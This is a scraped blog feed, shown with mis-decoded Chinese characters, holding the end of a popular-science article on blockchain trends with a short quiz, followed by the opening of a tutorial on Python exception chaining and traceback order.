<li><strong>äº‘æœåŠ¡å•†æä¾›BaaS</strong>ï¼šAWSã€Azureã€é˜¿é‡Œäº‘ç­‰æä¾›åŒºå—é“¾æœåŠ¡</li>
<li><strong>é™ä½ä½¿ç”¨é—¨æ§›</strong>ï¼šä¼ä¸šå¯ä»¥å¿«é€Ÿéƒ¨ç½²å’Œä½¿ç”¨åŒºå—é“¾</li>
<li><strong>æ ‡å‡†åŒ–æœåŠ¡</strong>ï¼šæä¾›æ ‡å‡†åŒ–çš„APIå’Œå·¥å…·</li>
</ul>
<h4 data-id="heading-37">4. ğŸ§  AIä¸åŒºå—é“¾ç»“åˆ</h4>
<ul>
<li><strong>AIé©±åŠ¨çš„åŒºå—é“¾</strong>ï¼šä½¿ç”¨AIä¼˜åŒ–åŒºå—é“¾çš„æ€§èƒ½å’Œå®‰å…¨æ€§</li>
<li><strong>åŒºå—é“¾å¢å¼ºçš„AI</strong>ï¼šä½¿ç”¨åŒºå—é“¾ä¿æŠ¤AIæ¨¡å‹å’Œæ•°æ®</li>
<li><strong>å»ä¸­å¿ƒåŒ–AI</strong>ï¼šåŸºäºåŒºå—é“¾çš„å»ä¸­å¿ƒåŒ–AIè®­ç»ƒå’Œæ¨ç†</li>
</ul>
<h4 data-id="heading-38">5. ğŸŒ Web3.0å’Œå…ƒå®‡å®™</h4>
<ul>
<li><strong>åŒºå—é“¾æˆä¸ºWeb3.0æ ¸å¿ƒ</strong>ï¼šæ”¯æŒå»ä¸­å¿ƒåŒ–èº«ä»½ã€æ•°æ®æ‰€æœ‰æƒç­‰</li>
<li><strong>å…ƒå®‡å®™åŸºç¡€è®¾æ–½</strong>ï¼šNFTã€è™šæ‹ŸåœŸåœ°ã€å»ä¸­å¿ƒåŒ–é‡‘èç­‰</li>
<li><strong>ç”¨æˆ·ä½“éªŒæå‡</strong>ï¼šæ›´å‹å¥½çš„é’±åŒ…ã€æ›´æµç•…çš„äº¤æ˜“ä½“éªŒ</li>
</ul>
<h3 data-id="heading-39">ğŸ“ äº’åŠ¨å°æµ‹éªŒï¼šä½ ç­”å¯¹äº†å—ï¼Ÿ</h3>


















































<table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th><th>ä½ ç­”å¯¹äº†å—ï¼Ÿ</th></tr></thead><tbody><tr><td>åŒºå—é“¾çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>åˆ†å¸ƒå¼è´¦æœ¬æŠ€æœ¯</td><td>âœ…/âŒ</td></tr><tr><td>æ¯”ç‰¹å¸è¯ç”Ÿäºå“ªä¸€å¹´ï¼Ÿ</td><td>2009å¹´</td><td>âœ…/âŒ</td></tr><tr><td>ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦ä½¿ç”¨ä»€ä¹ˆè¯­è¨€ï¼Ÿ</td><td>Solidity</td><td>âœ…/âŒ</td></tr><tr><td>PoSå…±è¯†æœºåˆ¶çš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>èƒ½è€—ä½ã€äº¤æ˜“é€Ÿåº¦å¿«</td><td>âœ…/âŒ</td></tr><tr><td>è”ç›Ÿé“¾çš„å»ä¸­å¿ƒåŒ–ç¨‹åº¦å¦‚ä½•ï¼Ÿ</td><td>éƒ¨åˆ†å»ä¸­å¿ƒåŒ–</td><td>âœ…/âŒ</td></tr><tr><td>åŒºå—é“¾çš„äº”å¤§ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>åˆ†å¸ƒå¼ã€ä¸å¯ç¯¡æ”¹ã€æ—¶åºæ€§ã€å…±è¯†æœºåˆ¶ã€åŠ å¯†å®‰å…¨</td><td>âœ…/âŒ</td></tr><tr><td>DeFiçš„å…¨ç§°æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>å»ä¸­å¿ƒåŒ–é‡‘èï¼ˆDecentralized Financeï¼‰</td><td>âœ…/âŒ</td></tr><tr><td>NFTçš„å…¨ç§°æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>éåŒè´¨åŒ–ä»£å¸ï¼ˆNon-Fungible Tokenï¼‰</td><td>âœ…/âŒ</td></tr></tbody></table>
<h3 data-id="heading-40">ğŸ¯ ç»“è¯­ï¼šåŒºå—é“¾â€”â€”ä¿¡ä»»çš„æœºå™¨</h3>
<p>åŒºå—é“¾çš„æ ¸å¿ƒä»·å€¼æ˜¯<strong>å»ºç«‹ä¿¡ä»»</strong>ï¼Œå®ƒæ˜¯ä¸€å°"<strong>ä¿¡ä»»çš„æœºå™¨</strong>"ã€‚</p>
<p>ä»æ¯”ç‰¹å¸åˆ°Web3.0ï¼ŒåŒºå—é“¾æŠ€æœ¯æ­£åœ¨æ”¹å˜æˆ‘ä»¬çš„ç”Ÿæ´»å’Œå·¥ä½œæ–¹å¼ã€‚å®ƒä¸ä»…å¯ä»¥ç”¨äºåŠ å¯†è´§å¸ï¼Œè¿˜å¯ä»¥åº”ç”¨äºé‡‘èã€ä¾›åº”é“¾ã€åŒ»ç–—ã€æ”¿åŠ¡ç­‰å¤šä¸ªé¢†åŸŸã€‚</p>
<p><strong>è®°ä½</strong>ï¼š</p>
<ul>
<li>ğŸ”— åŒºå—é“¾ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œä½†å®ƒæ˜¯ä¸€é¡¹é©å‘½æ€§çš„æŠ€æœ¯</li>
<li>ğŸ’¡ åŒºå—é“¾çš„ä»·å€¼åœ¨äºè§£å†³ä¿¡ä»»é—®é¢˜</li>
<li>ğŸš€ åŒºå—é“¾çš„æœªæ¥åœ¨äºä¸å…¶ä»–æŠ€æœ¯ï¼ˆAIã€ç‰©è”ç½‘ã€5Gç­‰ï¼‰çš„ç»“åˆ</li>
<li>ğŸ“Š åŒºå—é“¾çš„åº”ç”¨éœ€è¦å¾ªåºæ¸è¿›ï¼Œä¸èƒ½ä¸€è¹´è€Œå°±</li>
</ul>
<p>ä¸‹æ¬¡å½“ä½ å¬åˆ°"åŒºå—é“¾"è¿™ä¸ªè¯æ—¶ï¼Œä¸è¦åªæƒ³åˆ°æ¯”ç‰¹å¸â€”â€”æƒ³æƒ³å®ƒæ›´å¹¿æ³›çš„åº”ç”¨ï¼Œæƒ³æƒ³å®ƒå¦‚ä½•æ”¹å˜æˆ‘ä»¬çš„ä¸–ç•Œï¼</p>
<h3 data-id="heading-41">ğŸ’¬ äº’åŠ¨è¯é¢˜</h3>
<ol>
<li>ä½ å¯¹åŒºå—é“¾çš„å°è±¡æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯åŠ å¯†è´§å¸è¿˜æ˜¯æŠ€æœ¯é©å‘½ï¼Ÿ</li>
<li>ä½ ä½¿ç”¨è¿‡å“ªäº›åŒºå—é“¾åº”ç”¨ï¼Ÿä½“éªŒå¦‚ä½•ï¼Ÿ</li>
<li>ä½ è§‰å¾—åŒºå—é“¾åœ¨å“ªä¸ªé¢†åŸŸçš„åº”ç”¨æœ€æœ‰å‰æ™¯ï¼Ÿ</li>
<li>ä½ å¯¹Web3.0å’Œå…ƒå®‡å®™æœ‰ä»€ä¹ˆçœ‹æ³•ï¼Ÿ</li>
<li>ä½ è®¤ä¸ºåŒºå—é“¾ä¼šå¦‚ä½•æ”¹å˜æˆ‘ä»¬çš„ç”Ÿæ´»ï¼Ÿ</li>
</ol>
<p>å¿«æ¥è¯„è®ºåŒºèŠèŠä½ çš„æƒ³æ³•ï¼ğŸ’¬ ç‚¹èµæ”¶è—ä¸è¿·è·¯ï¼Œå’±ä»¬ä¸‹æœŸç»§ç»­æ¢ç´¢è®¡ç®—æœºçš„"åä¸‡ä¸ªä¸ºä»€ä¹ˆ"ï¼ğŸ‰</p>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼Œä¸‹æœŸå¸¦ä½ è§£é”æ›´å¤šè®¡ç®—æœºçš„"å¥‡è‘©å†·çŸ¥è¯†"ï¼ğŸ¤“</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonå¼‚å¸¸é“¾ï¼šè°æ‰æ˜¯ç½ªé­ç¥¸é¦–ï¼Ÿä¸€æ¢"The above exception"çš„æ—¶é—´é¡ºåº]]></title>    <link>https://juejin.cn/post/7592148975849504811</link>    <guid>https://juejin.cn/post/7592148975849504811</guid>    <pubDate>2026-01-07T15:15:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592148975849504811" data-draft-id="7592148975849488427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonå¼‚å¸¸é“¾ï¼šè°æ‰æ˜¯ç½ªé­ç¥¸é¦–ï¼Ÿä¸€æ¢&quot;The above exception&quot;çš„æ—¶é—´é¡ºåº"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-07T15:15:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonå¼‚å¸¸é“¾ï¼šè°æ‰æ˜¯ç½ªé­ç¥¸é¦–ï¼Ÿä¸€æ¢"The above exception"çš„æ—¶é—´é¡ºåº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:15:27.000Z" title="Wed Jan 07 2026 15:15:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Pythonå¼‚å¸¸é“¾ï¼šè°æ‰æ˜¯ç½ªé­ç¥¸é¦–ï¼Ÿä¸€æ¢"The above exception"çš„æ—¶é—´é¡ºåº</h2>
<blockquote>
<p>å½“ä½ çœ‹åˆ°PythonæŠ¥é”™ä¿¡æ¯ä¸­çš„"The above exception was the direct cause of the following exception"æ—¶ï¼Œæ˜¯å¦æ›¾ç–‘æƒ‘è¿‡ï¼šåˆ°åº•å“ªä¸ªå¼‚å¸¸å…ˆå‘ç”Ÿï¼Ÿå“ªä¸ªæ‰æ˜¯é—®é¢˜çš„æ ¹æºï¼Ÿæœ¬æ–‡å°†æ·±å…¥Pythonå¼‚å¸¸é“¾æœºåˆ¶ï¼Œæ­å¼€å¼‚å¸¸å‘ç”Ÿé¡ºåºçš„ç¥ç§˜é¢çº±ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ä¸ªè®©äººå›°æƒ‘çš„æŠ¥é”™</h3>
<p>è®©æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªå…¸å‹çš„å¼‚å¸¸é“¾æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šé™¤é›¶é”™è¯¯</span>
<span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"æ–°çš„é”™è¯¯"</span>) <span class="hljs-keyword">from</span> e  <span class="hljs-comment"># ç¬¬äºŒæ­¥ï¼šæŠ›å‡ºæ–°å¼‚å¸¸</span>
</code></pre>
<p>è¿è¡Œç»“æœï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">Traceback (most recent <span class="hljs-keyword">call</span> last):
  File <span class="hljs-string">"test.py"</span>, line <span class="hljs-number">2</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;
    <span class="hljs-number">1</span> / <span class="hljs-number">0</span>
<span class="hljs-symbol">ZeroDivisionError:</span> division <span class="hljs-keyword">by</span> zero

The above exception was the direct cause <span class="hljs-keyword">of</span> the following exception:

Traceback (most recent <span class="hljs-keyword">call</span> last):
  File <span class="hljs-string">"test.py"</span>, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;
    raise ValueError(<span class="hljs-string">"æ–°çš„é”™è¯¯"</span>) <span class="hljs-keyword">from</span> e
<span class="hljs-symbol">ValueError:</span> æ–°çš„é”™è¯¯
</code></pre>
<p>é—®é¢˜æ¥äº†ï¼š<strong>å“ªä¸ªå¼‚å¸¸å…ˆå‘ç”Ÿï¼Ÿå“ªä¸ªæ‰æ˜¯"above exception"ï¼Ÿ</strong></p>
<h3 data-id="heading-2">å¼‚å¸¸é“¾çš„æ—¶é—´å¯†ç </h3>
<h4 data-id="heading-3">æ ¸å¿ƒåŸåˆ™ï¼šæ—¶é—´é€†åºå±•ç¤ºï¼Œæ ¹æºæœ€å…ˆå‘ç”Ÿ</h4>
<p>Pythonçš„å¼‚å¸¸é“¾å±•ç¤ºéµå¾ªä¸€ä¸ªçœ‹ä¼¼åç›´è§‰ä½†æå…¶åˆç†çš„åŸåˆ™ï¼š</p>
<blockquote>
<p><strong>å¼‚å¸¸ä¿¡æ¯æ˜¾ç¤ºé¡ºåºä¸å‘ç”Ÿæ—¶é—´ç›¸åï¼Œä½†æ–‡æœ¬æè¿°æ˜ç¡®æŒ‡å‡ºå› æœå…³ç³»</strong></p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_exception_timeline</span>():
    <span class="hljs-string">"""å¼‚å¸¸æ—¶é—´çº¿æ¼”ç¤º"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== å¼‚å¸¸å‘ç”Ÿçš„æ—¶é—´çº¿ ==="</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"t1: åŸå§‹å¼‚å¸¸å‘ç”Ÿ (ZeroDivisionError)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"t2: æ–°å¼‚å¸¸è¢«è§¦å‘ (ValueError)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"t3: å¼‚å¸¸é“¾è¢«å±•ç¤º (æ˜¾ç¤ºé¡ºåº)"</span>)
    <span class="hljs-built_in">print</span>()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== æ˜¾ç¤ºé¡ºåº ==="</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"1. ZeroDivisionError (t1å‘ç”Ÿçš„å¼‚å¸¸)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"2. 'The above exception...' (è¿æ¥æ–‡æœ¬)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"3. ValueError (t2å‘ç”Ÿçš„å¼‚å¸¸)"</span>)

show_exception_timeline()
</code></pre>
<h4 data-id="heading-4">æ–‡æœ¬æè¿°çš„ç²¾ç¡®å«ä¹‰</h4>
<p>è®©æˆ‘ä»¬è§£æå…³é”®å¥å­çš„è¯­æ³•ç»“æ„ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"The above exception"</span> - æŒ‡ä»£çš„æ˜¯ï¼š
âœ… åœ¨æ–‡æœ¬ä¸­ä½ç½®é ä¸Šçš„å¼‚å¸¸
âœ… åœ¨æ—¶é—´çº¿ä¸Šå…ˆå‘ç”Ÿçš„å¼‚å¸¸
âœ… åœ¨å› æœå…³ç³»ä¸­çš„<span class="hljs-string">"å› "</span>ï¼ˆcauseï¼‰

<span class="hljs-string">"was the direct cause of the following exception"</span> - è¡¨ç¤ºï¼š
âœ… ä¸Šé¢çš„å¼‚å¸¸å¯¼è‡´äº†ä¸‹é¢çš„å¼‚å¸¸
âœ… å› æœå…³ç³»æ˜¯ç›´æ¥çš„ï¼ˆdirect causeï¼‰
âœ… æ—¶é—´é¡ºåºæ˜¯å…ˆåå…³ç³»
</code></pre>
<h3 data-id="heading-5">ä¸¤ç§å¼‚å¸¸é“¾çš„æ—¶åºåˆ†æ</h3>
<h4 data-id="heading-6">1. æ˜¾å¼å¼‚å¸¸é“¾ï¼ˆExplicit Chainingï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ¡ˆä¾‹ï¼šæ•°æ®åº“è¿æ¥å¤±è´¥åçš„å¤„ç†</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_database</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># t1: å°è¯•è¿æ¥ï¼Œæ–‡ä»¶ä¸å­˜åœ¨</span>
        <span class="hljs-built_in">open</span>(<span class="hljs-string">"config.db"</span>, <span class="hljs-string">"r"</span>)  
    <span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> original_error:
        <span class="hljs-comment"># t2: åŒ…è£…æˆæ•°æ®åº“é”™è¯¯</span>
        <span class="hljs-keyword">raise</span> DatabaseError(<span class="hljs-string">"æ•°æ®åº“é…ç½®ä¸¢å¤±"</span>) <span class="hljs-keyword">from</span> original_error

<span class="hljs-comment"># æ—¶é—´çº¿ï¼š</span>
<span class="hljs-comment"># t1: FileNotFoundError - "config.db"ä¸å­˜åœ¨</span>
<span class="hljs-comment"># t2: DatabaseError - åŒ…è£…åçš„æ•°æ®åº“é”™è¯¯</span>
</code></pre>
<p><strong>è¾“å‡ºåˆ†æï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl">Traceback (most recent call <span class="hljs-keyword">last</span>):      <span class="hljs-comment"># â† è¿™æ˜¯t1æ—¶åˆ»çš„å¼‚å¸¸</span>
  File <span class="hljs-string">"db.py"</span>, line <span class="hljs-number">3</span>, in connect_database
    <span class="hljs-keyword">open</span>(<span class="hljs-string">"config.db"</span>, <span class="hljs-string">"r"</span>)
FileNotFoundError: [Errno <span class="hljs-number">2</span>] No such file <span class="hljs-keyword">or</span> directory: <span class="hljs-string">'config.db'</span>

The above exception was the direct cause of the following exception:  <span class="hljs-comment"># â† t1å¯¼è‡´t2</span>

Traceback (most recent call <span class="hljs-keyword">last</span>):      <span class="hljs-comment"># â† è¿™æ˜¯t2æ—¶åˆ»çš„å¼‚å¸¸  </span>
  File <span class="hljs-string">"db.py"</span>, line <span class="hljs-number">6</span>, in connect_database
    raise DatabaseError(<span class="hljs-string">"æ•°æ®åº“é…ç½®ä¸¢å¤±"</span>) from original_error
DatabaseError: æ•°æ®åº“é…ç½®ä¸¢å¤±
</code></pre>
<h4 data-id="heading-7">2. éšå¼å¼‚å¸¸é“¾ï¼ˆImplicit Chainingï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ¡ˆä¾‹ï¼šå¼‚å¸¸å¤„ç†ä¸­çš„æ„å¤–é”™è¯¯</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># t1: æ•°æ®æ ¼å¼é”™è¯¯</span>
        <span class="hljs-built_in">int</span>(<span class="hljs-string">"invalid"</span>)  
    <span class="hljs-keyword">except</span> ValueError:
        <span class="hljs-comment"># t2: åœ¨å¤„ç†å¼‚å¸¸æ—¶ä¸å°å¿ƒå¼•å‘äº†æ–°å¼‚å¸¸</span>
        <span class="hljs-built_in">print</span>(undefined_variable)  <span class="hljs-comment"># NameError</span>

<span class="hljs-comment"># æ—¶é—´çº¿ï¼š</span>
<span class="hljs-comment"># t1: ValueError - æ•°æ®è½¬æ¢å¤±è´¥</span>
<span class="hljs-comment"># t2: NameError - å˜é‡æœªå®šä¹‰ï¼ˆæ„å¤–é”™è¯¯ï¼‰</span>
</code></pre>
<p><strong>è¾“å‡ºåˆ†æï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl">Traceback (most recent call <span class="hljs-keyword">last</span>):      <span class="hljs-comment"># â† t1æ—¶åˆ»çš„å¼‚å¸¸</span>
  File <span class="hljs-string">"data.py"</span>, line <span class="hljs-number">3</span>, in process_data
    <span class="hljs-keyword">int</span>(<span class="hljs-string">"invalid"</span>)
ValueError: invalid literal <span class="hljs-keyword">for</span> <span class="hljs-keyword">int</span>() with base <span class="hljs-number">10</span>: <span class="hljs-string">'invalid'</span>

During handling of the above exception, another exception occurred:  <span class="hljs-comment"># â† t1å¤„ç†ä¸­å‘ç”Ÿt2</span>

Traceback (most recent call <span class="hljs-keyword">last</span>):      <span class="hljs-comment"># â† t2æ—¶åˆ»çš„å¼‚å¸¸</span>
  File <span class="hljs-string">"data.py"</span>, line <span class="hljs-number">6</span>, in process_data
    <span class="hljs-keyword">print</span>(undefined_variable)
NameError: name <span class="hljs-string">'undefined_variable'</span> is <span class="hljs-keyword">not</span> <span class="hljs-keyword">defined</span>
</code></pre>
<h3 data-id="heading-8">åº•å±‚å®ç°ï¼šCPythonçš„å¼‚å¸¸é“¾æºç è§£æ</h3>
<h4 data-id="heading-9">å¼‚å¸¸å¯¹è±¡ç»“æ„ï¼ˆCå±‚é¢ï¼‰</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// Python/Objects/exceptions.c ä¸­çš„æ ¸å¿ƒç»“æ„</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    PyObject_HEAD
    PyObject *dict;           <span class="hljs-comment">// å¼‚å¸¸å±æ€§å­—å…¸</span>
    PyObject *args;           <span class="hljs-comment">// å¼‚å¸¸å‚æ•°</span>
    PyObject *traceback;      <span class="hljs-comment">// å›æº¯ä¿¡æ¯ (__traceback__)</span>
    PyObject *context;        <span class="hljs-comment">// éšå¼é“¾ (__context__) </span>
    PyObject *cause;          <span class="hljs-comment">// æ˜¾å¼é“¾ (__cause__)</span>
    <span class="hljs-type">char</span> suppress_context;    <span class="hljs-comment">// æ˜¯å¦æŠ‘åˆ¶ä¸Šä¸‹æ–‡</span>
} PyBaseExceptionObject;
</code></pre>
<h4 data-id="heading-10">å¼‚å¸¸é“¾æ‰“å°é€»è¾‘ï¼ˆPythonå±‚é¢ï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Lib/traceback.py ä¸­çš„å…³é”®å®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TracebackException</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">format</span>(<span class="hljs-params">self, *, chain=<span class="hljs-literal">True</span></span>):
        <span class="hljs-string">"""æ ¼å¼åŒ–å¼‚å¸¸ï¼ŒåŒ…æ‹¬å¼‚å¸¸é“¾"""</span>
        <span class="hljs-keyword">if</span> chain:
            <span class="hljs-comment"># é€’å½’å¤„ç†å¼‚å¸¸é“¾</span>
            <span class="hljs-keyword">if</span> self.exc.__cause__ <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-comment"># æ˜¾å¼å¼‚å¸¸é“¾</span>
                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> self.format_chain(self.exc.__cause__)
                <span class="hljs-keyword">yield</span> <span class="hljs-string">'\nThe above exception was the direct cause of the following exception:\n\n'</span>
            <span class="hljs-keyword">elif</span> (self.exc.__context__ <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> 
                  <span class="hljs-keyword">not</span> self.exc.__suppress_context__):
                <span class="hljs-comment"># éšå¼å¼‚å¸¸é“¾  </span>
                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> self.format_chain(self.exc.__context__)
                <span class="hljs-keyword">yield</span> <span class="hljs-string">'\nDuring handling of the above exception, another exception occurred:\n\n'</span>
        
